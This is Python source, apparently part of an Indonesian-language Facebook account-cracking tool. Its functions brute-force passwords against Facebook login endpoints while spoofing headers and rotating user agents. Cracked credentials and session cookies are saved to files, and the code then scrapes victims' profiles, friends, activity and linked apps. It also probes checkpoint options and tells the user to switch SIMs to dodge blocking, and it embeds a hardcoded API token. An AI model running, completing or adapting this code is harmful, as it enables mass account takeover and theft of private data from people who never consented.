                        apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
                        ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
                        for muncul in apkAktif:
                            hit1+=1
                            infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
                            hit2+=1
                            if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                                infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
                            else:
                                hit1,hit2=0,0
                                infoakun += (f"	Aplikasi Kedaluwarsa :\n")
                                apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
                                kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
                                for muncul in apkKadaluarsa:
                                    hit1+=1
                                    infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
                                    hit2+=1
                                else:pass
                                print('\n')
                                statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
                                statusok1 = nel(statusok, style='green')
                                cetak(nel(statusok1, title='OK'))
                                break
                else:
                    continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
            loop+=1
            
            
def crack2(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
    ua = random.choice(ugen).replace('\n','')
    ses = requests.Session()
    for pw in pwv:
        try:
            head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
            if "www.facebook.com" in resp.json()["error_msg"]:
                if 'ya' in oprek:
                    akun.append(idf+'|'+pw)
                    ceker(idf,pw)
                else:
                    print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akun.append(idf+'|'+pw)
                    cp+=1
                    break
            elif "session_key" in resp.text and "EAAA" in resp.text:
                    print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
                    open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                    ok+=1
                    break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
            loop+=1

def crack3(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s >°< %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'[•] ID : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SESI'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[OK]       : {idf}\n[OK] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'   
				elif 'ya'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
				
					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	—_Aplikasi Aktif : \n")
							infoakun += (f"	—_Aplikasi Kedaluwarsa : \n")
					else:pass
					print('\n')
					statusok = f'[CP]       : {idf}\n[CP] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
def cek_opsi():
    c = len(akun)
    hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
    cetak(nel(hu, title='CEK OPSI'))
    input(x+'['+h+'•'+x+'] Mulai')
    cek = '# PROSES CEK OPSI DIMULAI'
    sol().print(mark(cek, style='green'))
    love = 0
    for kes in akun:
        try:
            try:
                id,pw = kes.split('|')[0],kes.split('|')[1]
            except IndexError:
                time.sleep(2)
                print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
                print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
                continue
            bi = random.choice([u,k,kk,b,h,hh])
            print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
            ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
            ses = requests.Session()
            header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            hi = ses.get('https://mbasic.facebook.com')
            ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
            if "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jo = ho.find('form')
                    data = {}
                    lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                    for anj in jo('input'):
                        if anj.get('name') in lion:
                            data.update({anj.get('name'):anj.get('value')})
                            kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
                            print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                            opsi = kent.find_all('option')
                            if len(opsi)==0:
                                print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                            else:
                                for opsii in opsi:
                                    print('\r%s---> %s%s'%(kk,opsii.text,x))
                except:
                    print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                    print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
            elif "c_user" in ses.cookies.get_dict().keys():
                print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
            else:
                print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
                love+=1
        except requests.exceptions.ConnectionError:
                    print('')
                    li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                    sol().print(mark(li, style='red'))
                    exit()
                    dah = '# DONE'
                    sol().print(mark(dah, style='cyan'))
                    exit()

def uagent():
	print ("\n[01]. Ganti user agent ")
	print ("[02]. Cek user agent ")
	print ("[00]. Kembali ")
	__Aang__Sayang__Laura__ = input('\n[+] Pilih : ')
	uas(__Aang__Sayang__Laura__)
	
def uas(__Aang__Sayang__Laura__):
	if __Aang__Sayang__Laura__ == '':
		print ('\n[!] Yang bener kontol');time.sleep(2)
		uas(__Aang__Sayang__Laura__)
	elif __Aang__Sayang__Laura__ in("1","01"):
		print ("[!] Ketik cancel untuk gunakan ua dari script")
		ua = input("[!] User agent : ")
		if ua in(""):
			print ('\n[!] Yang bener kontol');time.sleep(2)
			daftar_menu()
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);time.sleep(2)
			print ("\n[✓]  Berhasil menggunakan user agent script ");time.sleep(2)
			daftar_menu()
		open("ua.txt","w").write(ua);time.sleep(2)
		print ("\n[✓] Berhasil mengganti user agent");time.sleep(2)
		daftar_menu()
	elif __Aang__Sayang__Laura__ in("2","02"):
		try:
			ualo = open('ua.txt', 'r').read();time.sleep(2)
			print ("[+] User anget lu : "+ualo);time.sleep(2)
			input('\n[!] Tekan enter ')
			daftar_menu()
		except IOError:
			print('error')
	elif __Aang__Sayang__Laura__ in("0","00"):
		daftar_menu()
	else:
		print ('\n[!] Yang bener bang');time.sleep(2)
		uas(__Aang__Sayang__Laura__)
		
if __name__ == '__main__':
    try:
        os.system('git pull');daftar_menu()
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
